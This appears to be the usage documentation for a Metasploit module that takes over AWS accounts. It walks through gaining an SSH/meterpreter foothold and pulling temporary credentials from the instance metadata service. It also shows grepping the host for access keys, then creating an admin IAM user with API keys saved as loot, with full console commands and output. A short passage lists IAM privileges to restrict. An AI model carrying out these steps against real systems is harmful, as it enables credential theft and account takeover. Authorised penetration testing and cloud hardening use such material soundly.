# aws_create_iam_user

aws_create_iam_user is a simple post module that can be used to take over AWS
accounts. Sure, it is fun enough to take over a single host, but you can own all
hosts in the account if you simply create an admin user.

# Background

## Instance Profiles

An Instance Profile is an AWS construct that maps a role to a host (instance).
Not all hosts have instance profiles and/or may have restricted privileges.
AWS roles are composed of policies which specify API calls that the host is
allowed to make.

## Privileges

This module depends on administrators being lazy and not using the least
privileges possible. We often see instances assigned `*.*` roles that allow
any user on the instance to make any API call including creating admin users.
When this occours, a user with long lived credentials can be created and calls
against the AWS API can be made from anywhere on the Internet. Once an account
is taken over in this manner instances can be spun up, other users can be locked
out, networks can be traversed, and many other dangeous things can happen.

Only on rare cases should hosts have the following privileges, these should be
restriced.

* iam:CreateUser
* iam:CreateGroup
* iam:PutGroupPolicy
* iam:AddUserToGroup
* iam:CreateAccessKey

This module will attempt all API calls listed above in sequence. Account takeover
may succeed even if intermediate API calls fail. E.g., we may not be able to
create a new user, but we may be able to create access keys for an existing user.

## Metadata Service

The metadata service is a mechanism the AWS hypervisor employs to pass
information down into hosts. Any AWS host can retrieve information about itself
and its environemtn by curling http://169.254.169.254/. This mechanism is also
used to pass temporary credentials to a host. This module pulls these temporary
credentials and attempts to create a user with admin privileges.

To manually check that a host has an instance profile you can simply curl the
metadata service like so:

```
$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
SOME_ROLE_NAME
$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/SOME_ROLE_NAME
{
  "Code" : "Success",
  "LastUpdated" : "2016-12-07T18:36:48Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA
  ...
```

# Usage

aws_create_iam_user can be used to take over an AWS account given access to
a host having 1). overly permissive instance profile/role, 2). API Access keys.
Once a foothold is established, you can run the module to pull temporary
access keys from the metadata service. If this fails, search the instance for
API access keys, e.g., see ~/aws/credentals, and set `AccessKeyId`,
`SecretAccessKey`, & `Token` (optional). 

## Options

* `IAM_USERNAME`: set this if you would like to control the username for to user to be created
* `AccessKeyId`: set this if you find access keys on the host and instance has no profile/privileges
* `SecretAccessKey`: set this if you find access keys on the host and instance has no profile/privileges
* `Token`: set this if you find access keys on the host and instance has no profile/privileges. This is optional as this signifies temporary keys, if you find these, these are most likely expired.
* `Proxies`: depending on your environment, you may wan to proxy your calls to AWS.


### Establish a foothold

You first need a foothold in AWS, e.g., here we use `sshexec` to get the
foothold and launch a meterpreter session.

```
$ ./msfconsole
...
msf > use exploit/multi/ssh/sshexec
msf exploit(sshexec) > set password some_user
password => some_user
msf exploit(sshexec) > set username some_user
username => some_user
msf exploit(sshexec) > set RHOST 192.168.1.2
RHOST => 192.168.1.2
msf exploit(sshexec) > set payload linux/x86/meterpreter/bind_tcp
payload => linux/x86/meterpreter/bind_tcp
msf exploit(sshexec) > exploit -j
[*] Exploit running as background job.

[*] Started bind handler
msf exploit(sshexec) > [*] 192.168.1.2:22 - Sending stager...
[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
[*] Command Stager progress -  42.09% done (306/727 bytes)
[*] Command Stager progress - 100.00% done (727/727 bytes)
[*] Sending stage (1495599 bytes) to 192.168.1.2
[*] Meterpreter session 1 opened (192.168.1.1:33750 -> 192.168.1.2:4444) at 2016-11-21 17:58:42 +0000
```

We will be using session 1.

```
msf exploit(sshexec) > sessions

Active sessions
===============

  Id  Type                   Information                                                                       Connection
  --  ----                   -----------                                                                       ----------
  1   meterpreter x86/linux  uid=50011, gid=50011, euid=50011, egid=50011, suid=50011, sgid=50011 @ ip-19-...  192.168.1.1:41634 -> 192.168.1.2:4444 (192.168.1.2)

```

## Overly Permissive Instance Profile

Here we are assuming that we have taken over a host having an instance profile with
overly permissive access. Once a session is established, we can load
`aws_create_iam_user` and specify a meterpreter sesssion,
e.g., `SESSION 1` and run the exploit.

```
msf exploit(sshexec) > use auxiliary/admin/aws/aws_create_iam_user
msf post(aws_create_iam_user) > set SESSION 1
SESSION => 1
msf post(aws_create_iam_user) > exploit

[*] 169.254.169.254 - looking for creds...
[*] Creating user: J2XXox11WW4brAcb
[*] Connecting (iam.amazonaws.com)...
[*] Creating group: J2XXox11WW4brAcb
[*] Connecting (iam.amazonaws.com)...
[*] Creating group policy: J2XXox11WW4brAcb
[*] Connecting (iam.amazonaws.com)...
[*] Adding user (J2XXox11WW4brAcb) to group: J2XXox11WW4brAcb
[*] Connecting (iam.amazonaws.com)...
[*] Creating API Keys for J2XXox11WW4brAcb
[*] Connecting (iam.amazonaws.com)...
[+] API keys stored at: /home/pwner/.msf4/loot/20161121175902_default_52.1.2.3_AKIA_881948.txt
[*] Post module execution completed
```

If the host does not have an instance profile or the right access, the output will look like so:

```
[*] 169.254.169.254 - looking for creds...
[*] Creating user: 3SFFML3ucP1AyP7J
[*] Connecting (iam.amazonaws.com)...
[-] User: arn:aws:sts::097986286576:assumed-role/msftest/i-abacadab is not authorized to perform: iam:CreateUser on resource: arn:aws:iam::097986286576:user/3SFFML3ucP1AyP7J
[*] Creating group: 3SFFML3ucP1AyP7J
[*] Connecting (iam.amazonaws.com)...
[-] User: arn:aws:sts::097986286576:assumed-role/msftest/i-abacadab is not authorized to perform: iam:CreateGroup on resource: arn:aws:iam::097986286576:group/3SFFML3ucP1AyP7J
[*] Creating group policy: 3SFFML3ucP1AyP7J
[*] Connecting (iam.amazonaws.com)...
[-] User: arn:aws:sts::097986286576:assumed-role/msftest/i-abacadab is not authorized to perform: iam:PutGroupPolicy on resource: group 3SFFML3ucP1AyP7J
[*] Adding user (3SFFML3ucP1AyP7J) to group: 3SFFML3ucP1AyP7J
[*] Connecting (iam.amazonaws.com)...
[-] User: arn:aws:sts::097986286576:assumed-role/msftest/i-abacadab is not authorized to perform: iam:AddUserToGroup on resource: group 3SFFML3ucP1AyP7J
[*] Creating API Keys for 3SFFML3ucP1AyP7J
[*] Connecting (iam.amazonaws.com)...
[-] User: arn:aws:sts::097986286576:assumed-role/msftest/i-abacadab is not authorized to perform: iam:CreateAccessKey on resource: user 3SFFML3ucP1AyP7J
[*] Post module execution completed
```

## API Access Keys

In the case that the host we have taken over has no instance profile or does not
have the required privileges, we can search the host for access keys with
something like `grep -r AKIA /`. These keys may have admin privileges at which
point you own the account, if not we may be able to escalate privileges.
We can set `AccessKeyId`, `SecretAccessKey`, & `Token` (optional) and rerun
the exploit to test this possibility.

```
msf exploit(sshexec) > use auxiliary/admin/aws/aws_create_iam_user
msf post(aws_create_iam_user) > set AccessKeyId AKIAAKIAAKIAAKIAAKIA
AccessKeyId => AKIAAKIAAKIAAKIAAKIA
msf post(aws_create_iam_user) > set SecretAccessKey jhsdlfjkhalkjdfhalskdhfjalsjkakhksdfhlah
SecretAccessKey => jhsdlfjkhalkjdfhalskdhfjalsjkakhksdfhlah
msf post(aws_create_iam_user) > set SESSION 1
SESSION => 1
msf post(aws_create_iam_user) > run

[*] 169.254.169.254 - looking for creds...
[*] Creating user: NyTDbU9v6LzzCLXq
[*] Connecting (iam.amazonaws.com)...
[*] Creating group: NyTDbU9v6LzzCLXq
[*] Connecting (iam.amazonaws.com)...
[*] Creating group policy: NyTDbU9v6LzzCLXq
[*] Connecting (iam.amazonaws.com)...
[*] Adding user (NyTDbU9v6LzzCLXq) to group: NyTDbU9v6LzzCLXq
[*] Connecting (iam.amazonaws.com)...
[*] Creating API Keys for NyTDbU9v6LzzCLXq
[*] Connecting (iam.amazonaws.com)...
[+] API keys stored at: /home/pwner/.msf4/loot/20161121175902_default_52.1.2.3_AKIA_881948.txt
[*] Post module execution completed
```

## Loot

You can see the API keys stored in loot:

```
$ cat ~/.msf4/loot/20161121175902_default_52.1.2.3_AKIA_881948.txt

{"AccessKeyId":"AKIA...","SecretAccessKey":"THE SECRET ACCESS KEY...","AccessKeySelector":"HMAC","UserName":"metasploit","Status":"Active","CreateDate":"2016-11-21T17:59:51.967Z"}
```